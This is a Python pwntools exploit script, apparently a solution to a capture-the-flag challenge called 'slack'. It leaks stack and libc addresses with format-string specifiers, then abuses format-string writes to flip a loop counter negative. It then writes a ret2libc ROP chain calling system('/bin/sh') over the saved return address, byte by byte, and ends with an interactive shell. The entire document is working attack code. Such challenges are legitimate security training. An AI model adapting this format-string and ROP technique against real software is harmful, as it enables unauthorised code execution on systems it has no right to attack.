#!/usr/bin/python3

from pwn import *

exe = ELF('slack_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
	p = remote('challs.actf.co', 31500)
	# p = remote('127.0.0.1', 5000)
else:
	p = process(exe.path)

##########################################
### Stage 1: Leak stack & libc address ###
##########################################
payload = b'%21$p%25$p'
sla(b'Professional): ', payload)

p.recvuntil(b'You: ')
datas = p.recvline()[:-1].split(b'0x')
libc_leak = int(datas[1], 16)
libc.address = libc_leak - 0x29d90
stack_leak = int(datas[2], 16)
i_addr = stack_leak - 0x180
info("Libc leak: " + hex(libc_leak))
info("Libc base: " + hex(libc.address))
info("Stack leak: " + hex(stack_leak))
info("var i @: " + hex(i_addr))

################################################
### Stage 2: Change i to negative number ###
################################################
# Change stack to i address
payload1 = f'%{(i_addr & 0xffff) + 3}c%25$hn'.encode()
payload1 = payload1.ljust(13, b'P')

# Change i
payload2 = f'%{0x80}c%55$hn'.encode()
sla(b'Professional): ', payload1 + payload2)

################################
### Stage 3: Input ROP chain ###
################################
# Prepare ROP chain
pop_rdi = libc.address + 0x00000000001b9815
ret = pop_rdi + 1
rop_payload = flat(
	ret,
	pop_rdi, next(libc.search(b'/bin/sh')),
	libc.sym['system']
	)

# Enter rop
saved_rip_addr = stack_leak - 0x110
for i in range(len(rop_payload)):
	payload1 = f'%{(saved_rip_addr & 0xffff) + i}c%25$hn'.encode()
	payload1 = payload1.ljust(13, b'P')

	if rop_payload[i] == 0:
		payload2 = b'%55$hhn'
	else:
		payload2 = f'%{rop_payload[i]}c%55$hhn'.encode()
	sl(payload1 + payload2)

#################################################
### Stage 4: Change i back to positive number ###
#################################################
# Change stack to i address
payload1 = f'%{(i_addr & 0xffff) + 3}c%25$hn'.encode()
payload1 = payload1.ljust(13, b'P')

# Change i
payload2 = f'%{0x1}c%55$hn'.encode()
sla(b'Professional): ', payload1 + payload2)

p.interactive()